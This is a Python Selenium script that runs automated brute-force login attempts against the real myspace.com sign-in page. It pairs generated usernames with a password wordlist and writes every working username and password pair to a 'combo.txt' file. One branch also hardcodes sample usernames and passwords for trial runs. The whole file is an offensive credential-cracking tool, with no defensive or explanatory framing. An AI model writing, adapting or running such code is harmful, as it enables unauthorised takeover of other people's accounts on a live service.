from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from cracked import brute_u
from selenium.webdriver.common.keys import Keys

ser = Service("H://chromedriver.exe")
driver = webdriver.Chrome(service=ser)
f = open('passwords.txt', 'r')
p = open("combo.txt", "w")

def main():
    url = "https://myspace.com/signin"
    x = int(input('enter length range for potential username: '))
    if x == -1:
        usr_list = ["pihihet7291", "decohof15222", "hirisoh74112"]
        pass_list = ["livinglaughinglovinglatrine578", "unfortunateUFO<3", "malignantmarsupial1246", "wingedwitched53", "mypasswordisgood225", "mypasswordisgood224", "frenchandfries29", "chickennoodlesoup32"]
        driver.maximize_window()
        driver.get("https://myspace.com")
        cact = ActionChains(driver)
        cact.click(on_element=driver.find_element(By.ID, "sign-in")).perform()
        cact.reset_actions()
        cusr_box = driver.find_element(By.NAME, "email")
        cpass_box = driver.find_element(By.NAME, "password")
        for u in usr_list:
            us = u.strip()
            cact.click(on_element=cusr_box).key_down(Keys.CONTROL).send_keys(Keys.ARROW_RIGHT + Keys.BACKSPACE).perform()
            cact.reset_actions()
            cact.click(on_element=cusr_box).send_keys(us).perform()
            for pw in pass_list:
                pword = pw.strip()
                cact.click(on_element=cpass_box).key_down(Keys.CONTROL).send_keys(Keys.ARROW_RIGHT + Keys.BACKSPACE).perform()
                cact.reset_actions()
                cact.click(on_element=cpass_box).send_keys(pword).perform()
                csub_box = driver.find_element(By.CLASS_NAME, "primary")
                cact.reset_actions()
                cact.click(on_element=csub_box).perform()
                if driver.current_url != url:
                    p.write(u + ", " + pw)
                    cact.reset_actions()
                    cact.click(on_element=driver.find_element((By.CLASS_NAME, "settings svg"))).perform()
                    cact.click(on_element=driver.find_element(By.LINK_TEXT, "Sign Out")).perform()
                    cact.click(on_element=driver.find_element(By.ID, "sign-in")).perform()
                    break
        return
    driver.maximize_window()
    driver.get("https://myspace.com/signin")
    usr_box = driver.find_element(By.NAME, "email")
    pass_box = driver.find_element(By.NAME, "password")
    sub_box = driver.find_element(By.CLASS_NAME, "primary")
    act = ActionChains(driver)
    list = brute_u(x)
    for u in list[1:]:
        user = u.strip()
        act.click(on_element=usr_box).send_keys(user).perform()
        for pw in f:
            password = pw.strip()
            act.click(on_element=pass_box).key_down(Keys.CONTROL).send_keys(Keys.ARROW_RIGHT + Keys.BACKSPACE).perform()
            act.reset_actions()
            act.click(on_element=pass_box).send_keys(password).perform()
            act.click(on_element=sub_box).perform()
            if driver.current_url != url:
                p.write(user + ", " + password)
                act.reset_actions()
                act.click(on_element=driver.find_element((By.CLASS_NAME, "settings svg"))).perform()
                act.click(on_element=driver.find_element(By.LINK_TEXT, "Sign Out")).perform()
                act.click(on_element=driver.find_element(By.ID, "sign-in")).perform()
                act.click(on_element=usr_box).send_keys(user).perform()


if __name__ == '__main__':
    main()